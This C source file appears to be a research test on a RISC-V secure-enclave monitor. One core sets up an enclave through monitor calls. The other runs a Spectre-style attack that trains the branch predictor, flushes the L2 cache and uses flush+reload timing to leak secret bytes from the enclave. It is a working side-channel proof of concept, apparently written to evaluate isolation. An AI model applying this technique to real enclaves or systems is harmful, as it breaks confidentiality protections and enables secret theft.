#include <os_util.h>
#include <csr/csr.h>
#include <api_untrusted.h>
#include <enclave_api.h>
#include <msgq.h>

//extern uintptr_t region1;
extern uintptr_t region2;
extern uintptr_t region3;

extern uintptr_t enclave_start;
extern uintptr_t enclave_end;

#define SHARED_MEM_SYNC (0x90000000)

#define STATE_0 1
#define STATE_1 2
#define STATE_2 3
#define STATE_3 4

#define SIZE_REGION (0x2000000)
#define SIZE_PAGE   (0x1000)
#define SIZE_L2     (0x100000)

// Array in shared memory use for the side channel
char *second_array= (char *) (SHARED_MEM_REG + SIZE_REGION - (256 * SIZE_PAGE));
// Buffer accessed to flush the L2 cache
char *flush_buffer = (char *) (SHARED_MEM_REG + SIZE_REGION - (2 * SIZE_L2));

// Prepare Shared Memory for side Channel
static inline void init_shared_memory() {
  // Load TLB entries (There shoudl only be one as we use mega pages)
  for(int i = 0; i < 256; i++) {
    second_array[i * SIZE_PAGE] = 0x56;
    // should try to fush line here
  }
}

// Flush the L2 cache (1MB)
void flush_l2_cache() {
  __attribute__((unused)) int b;
  for(int i = 0; i <= (SIZE_L2 / 4); i++) { // this /4 was found empirically
    // Access the lines in a (poor) pseudo-random order 
    int idx = ((i * 19937)) % SIZE_L2;
    b = flush_buffer[idx];
  }
}

// Measure the number of cycles to access an address.
uint64_t static inline time_access(void *addr) {
  __attribute__((unused)) unsigned int tmp;
  uint64_t time1, time2;
  time1 = read_csr(cycle);
  tmp = *(unsigned int *)addr;
  time2 = read_csr(cycle);
  return time2 - time1;
}

#define N_TRAIN_BRANCH 10

// Function used to leak a given offset
static inline char leak_byte(int current_offset) {

  //// BRANCH TRAINING
  for(int j = 0; j < N_TRAIN_BRANCH; j++) {
    call_specter_gadget(j%3); // Call the encalve gadget with array indexes that are legits
  }

  // Wait for the responses from the enclave
  msg_t *m;
  queue_t *qresp = SHARED_RESP_QUEUE;
  int ret;
  int cnt = 0;

  do {
    ret = pop(qresp, (void **) &m);
    if((ret == 0) && (m->f == F_SPECTER)) {
      cnt++;
    }
  } while((ret != 0) || (cnt < N_TRAIN_BRANCH));

  //// FLUSH
  flush_l2_cache();

  //asm volatile("fence");
  //asm volatile("fence.i");

  //// ATTACK
  // Call the specter gadget inside of the enclave with a wrong offset
  call_specter_gadget(current_offset);
  
  // Wait for the end of the enclave function
  do {
    ret = pop(qresp, (void **) &m);
    if(ret == 0) {
      printm("ret = %d\n", m->ret); // Make sure ret = 0 i.e. the access was speculative
    }
  } while((ret != 0) || (!is_empty(qresp)));

//// RELOAD
// Access the array used for transmission and find the mem access that takes the less time
// as it means that piece of data was accessed by the transmitter located in the enclave
uint64_t val;
uint64_t min_i = 0;
uint64_t min_val = 10000000;
unsigned int N = 256;
//uint64_t trace[256]; // Save the values if needed for debugging
for(int i = 0; i < N; i++) {
  val = time_access(&(second_array[i * SIZE_PAGE]));
  //trace[i] = val;
  if(val < min_val) {
    min_val = val;
    min_i = i;
  }
}

/* // Print access times for debugging
for (int i = 4; i < N; i++) {
  if(i == min_i) {
    printm("\nHERE\n\n");
  }
  printm("%d: %ld\n", i, trace[i]);
}
*/

return (char) min_i; // Return the identified byte
}

// Function launched after Boot
void os_entry(int core_id, uintptr_t fdt_addr) {
  volatile int *flag = (int *) SHARED_MEM_SYNC;

  if(core_id == 0) { // Core 0 sets up the enclave and and executes it
    uint64_t region2_id = addr_to_region_id((uintptr_t) &region2);
    uint64_t region3_id = addr_to_region_id((uintptr_t) &region3);

    api_result_t result;

    printm("\n");

    printm("Region Block\n");

    result = sm_region_block(region3_id);
    if(result != MONITOR_OK) {
      printm("sm_region_block FAILED with error code %d\n\n", result);
      test_completed();
    }

    printm("Region Free\n");

    result = sm_region_free(region3_id);
    if(result != MONITOR_OK) {
      printm("sm_region_free FAILED with error code %d\n\n", result);
      test_completed();
    }

    printm("Region Metadata Create\n");

    result = sm_region_metadata_create(region3_id);
    if(result != MONITOR_OK) {
      printm("sm_region_metadata_create FAILED with error code %d\n\n", result);
      test_completed();
    }

    uint64_t region_metadata_start = sm_region_metadata_start();

    enclave_id_t enclave_id = ((uintptr_t) &region3) + (PAGE_SIZE * region_metadata_start);
    uint64_t num_mailboxes = 1;

    printm("Enclave Create\n");

    result = sm_enclave_create(enclave_id, 0x0, REGION_MASK, num_mailboxes, true);
    if(result != MONITOR_OK) {
      printm("sm_enclave_create FAILED with error code %d\n\n", result);
      test_completed();
    }

    printm("Region Block\n");

    result = sm_region_block(region2_id);
    if(result != MONITOR_OK) {
      printm("sm_region_block FAILED with error code %d\n\n", result);
      test_completed();
    }

    printm("Region Free\n");

    result = sm_region_free(region2_id);
    if(result != MONITOR_OK) {
      printm("sm_region_free FAILED with error code %d\n\n", result);
      test_completed();
    }

    printm("Region Assign\n");

    result = sm_region_assign(region2_id, enclave_id);
    if(result != MONITOR_OK) {
      printm("sm_region_assign FAILED with error code %d\n\n", result);
      test_completed();
    }

    uintptr_t enclave_handler_address = (uintptr_t) &region2;
    uintptr_t enclave_handler_stack_pointer = enclave_handler_address + HANDLER_LEN + (STACK_SIZE * NUM_CORES);

    printm("Enclave Load Handler\n");

    result = sm_enclave_load_handler(enclave_id, enclave_handler_address);
    if(result != MONITOR_OK) {
      printm("sm_enclave_load_handler FAILED with error code %d\n\n", result);
      test_completed();
    }

    uintptr_t page_table_address = enclave_handler_stack_pointer;

    printm("Enclave Load Page Table\n");

    result = sm_enclave_load_page_table(enclave_id, page_table_address, 0, 3, NODE_ACL);
    if(result != MONITOR_OK) {
      printm("sm_enclave_load_page_table FAILED with error code %d\n\n", result);
      test_completed();
    }

    page_table_address += PAGE_SIZE;

    printm("Enclave Load Page Table\n");

    result = sm_enclave_load_page_table(enclave_id, page_table_address, 0, 2, NODE_ACL);
    if(result != MONITOR_OK) {
      printm("sm_enclave_load_page_table FAILED with error code %d\n\n", result);
      test_completed();
    }

    page_table_address += PAGE_SIZE;

    printm("Enclave Load Page Table\n");

    result = sm_enclave_load_page_table(enclave_id, page_table_address, 0, 1, NODE_ACL);
    if(result != MONITOR_OK) {
      printm("sm_enclave_load_page_table FAILED with error code %d\n\n", result);
      test_completed();
    }

    uintptr_t phys_addr = page_table_address + PAGE_SIZE;
    uintptr_t os_addr = (uintptr_t) &enclave_start;
    uintptr_t virtual_addr = 0;

    uint64_t size = ((uint64_t) &enclave_end) - ((uint64_t) &enclave_start);
    int num_pages_enclave = size / PAGE_SIZE;

    if((size % PAGE_SIZE) != 0) num_pages_enclave++;

    for(int i = 0; i < num_pages_enclave; i++) {

      printm("Enclave Load Page\n");

      result = sm_enclave_load_page(enclave_id, phys_addr, virtual_addr, os_addr, LEAF_ACL);
      if(result != MONITOR_OK) {
        printm("sm_enclave_load_page FAILED with error code %d\n\n", result);
        test_completed();
      }

      phys_addr    += PAGE_SIZE;
      os_addr      += PAGE_SIZE;
      virtual_addr += PAGE_SIZE;

    }

    uintptr_t enclave_sp = virtual_addr;

    uint64_t size_enclave_metadata = sm_enclave_metadata_pages(num_mailboxes);

    thread_id_t thread_id = enclave_id + (size_enclave_metadata * PAGE_SIZE);
    uint64_t timer_limit = 10000;

    printm("Thread Load\n");

    result = sm_thread_load(enclave_id, thread_id, 0x0, enclave_sp, timer_limit);
    if(result != MONITOR_OK) {
      printm("sm_thread_load FAILED with error code %d\n\n", result);
      test_completed();
    }

    printm("Enclave Init\n");

    result = sm_enclave_init(enclave_id);
    if(result != MONITOR_OK) {
      printm("sm_enclave_init FAILED with error code %d\n\n", result);
      test_completed();
    }

    // Let other thread know we are ready
    while(*flag != STATE_0);
    *flag = STATE_1;
    asm volatile("fence");

    printm("Enclave Enter\n");

    result = sm_enclave_enter(enclave_id, thread_id);
    //send_exit_cmd(0); // Used to do performances measurements for enclave functions

    printm("Test SUCCESSFUL\n\n");
    test_completed();
  }
  else if (core_id == 1) {
    *flag = STATE_0; // Wait for core 0 to finish setting up the enclave
    asm volatile("fence");
    while(*flag != STATE_1);

    init_enclave_queues();
    // HACKS ON HACKS - Leaves spaces for the two queues
    init_heap(SHARED_MEM_REG + (2 * sizeof(queue_t)), 500 * PAGE_SIZE);

    char leaked_str[64];

    int N = 10;
    for(int i = 0; i < N; i++) {
      leaked_str[i] = leak_byte(6); // Try to leak byte 6: "h"
    }

    printm("Leaked String : ");
    for(int i = 0; i < N; i ++) {
      printm("%d%c", i, leaked_str[i]);
    }
    printm("\n");
    printm("Send Enclave Exit\n");
    enclave_exit();

    msg_t *m;
    queue_t *qresp = SHARED_RESP_QUEUE;
    int ret;    

    do {
      ret = pop(qresp, (void **) &m);
      if(ret == 0) {
        printm("ret = %d\n", m->ret);
      }
    } while((ret != 0) || (m->f != F_EXIT));

    // *** END BENCHMARK *** 
    printm("Received enclave exit confirmation\n");
    //send_exit_cmd(0);
    test_completed();
  }
  else {
    printm("Core n %d\n\n", core_id);
    test_completed();
  }
}

